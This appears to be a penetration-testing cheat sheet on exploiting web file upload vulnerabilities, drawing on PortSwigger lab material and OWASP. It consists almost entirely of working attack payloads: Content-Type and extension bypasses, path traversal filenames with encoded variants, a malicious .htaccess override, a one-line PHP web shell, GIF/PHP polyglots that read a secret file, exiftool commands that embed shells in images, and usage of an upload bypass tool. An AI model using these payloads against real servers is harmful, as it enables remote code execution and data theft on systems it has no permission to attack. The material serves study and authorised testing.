# Overview

> **File upload vulnerabilities** occur when a web server allows users to upload files to its filesystem without adequately validating elements like file name, type, contents, or size. Without proper restrictions, even a basic image upload function can be exploited to upload potentially harmful files, such as server-side script files enabling remote code execution. Sometimes, simply uploading a file can cause damage; other times, a follow-up HTTP request for the file triggers server execution.  
> [File Upload - PortSwigger](https://portswigger.net/web-security/file-upload)

## Content-Type Restriction Bypass

When uploading a PHP file, modify the `Content-Type` as follows:

- **Original**: `Content-Type: application/x-php`
- **Bypass Options**:
  - `Content-Type: image/jpeg`
  - `Content-Type: image/png`

## Path Traversal

Uploading a PHP file to a different directory can exploit lesser controls in unintended directories:

- **Original**: 
```
Content-Disposition: form-data; name="avatar"; filename="secrets.php"
```
- **Path Traversal Example**:
```
Content-Disposition: form-data; name="avatar"; filename="../secrets.php"
```
- **Encoded Variants of `../`**:
```
..%2f
%2e%2e%2f
%252e%252e%252f
..%c0%af
..%ef%bc%8f
```
- **Accessing the File**:
```
GET /files/avatars/../secrets.php
```

## Overriding the Server Configuration

Many servers allow custom directory configurations to override global settings. For instance, **Apache servers** load directory-specific configurations from a `.htaccess` file.

1. **Upload a Malicious `.htaccess`**:
```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
```

2. **Upload PHP File with Custom Extension**:
```
Content-Disposition: form-data; name="avatar"; filename="secrets.l33t"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
```

## Web Shell Upload Bypass Techniques

### According to OWASP, Penetration Testers Can Use the Following Techniques to Bypass Protections:

- **URL Encoding** (or double encoding) for dots and slashes. If server-side decoding differs from validation, this can allow malicious uploads, such as `exploit%2Ephp`.
- **Multibyte Unicode Characters**: Convert sequences (e.g., `xC0 x2E`, `xC4 xAE`, or `xC0 xAE`) to `x2E` after UTF-8 parsing to bypass checks.
- **Content-Type Modification** in the header (using Burp, ZAP, etc.).
- **Server Executable Extensions**: `.php5`, `.shtml`, `.asa`, `.cert`.
- **Capitalization Changes**: `.aSp`, `.PHp3`.
- **Trailing Spaces/Dots**: `.asp..`, `.asp .`.
- **Semicolon with Extension**: `.asp;.jpg` (_works on IIS 6 or earlier_).
- **Double Extensions**: `file.php.jpg`.
- **Null Character**: `file.asp%00.jpg`.
- **Forbidden Extension with Permissible Variant**: `file.asp:.jpg` or `file.asp::$data`.
- **Combinations** of the above techniques.

## Remote Code Execution via Polyglot Web Shell Upload

To upload a PHP file when the server performs content verification (e.g., confirming it’s an image), disguise the PHP file as an image file.

1. **Add Image Header in PHP File**:
   - Prefix the file with `GIF89a;` (or add in Burp request):
   - **Request Example**:
 ```
 Content-Disposition: form-data; name="avatar"; filename="secrets.php"
 Content-Type: application/x-php
 ```

   - **GIF Header in PHP Code**:
```php
GIF89a;<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. **OR**:
```php
GIF89a;<?php system($_GET['cmd']); ?>
```

3. **Generate Polyglot Payload with `exiftool`**:

```bash
# Example 1
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

# Example 2
exiftool -Comment="<?php echo 'START ' . system($_GET['cmd']); . ' END'; ?>" $input.jpg -o polyglot.php
```

## upload_bypass

> **File upload restrictions bypass tool** that leverages various bug bounty techniques. Ensure the tool runs with all assets.

### Installation and Usage

```bash
git clone https://github.com/sAjibuu/upload_bypass.git
cd upload_bypass/
pip3 install -r requirements.txt

python3 ext_bypass.py -u $url -e $extension-file -a $allowed-extension -s $success-msg --location $path-of-uploaded-file
```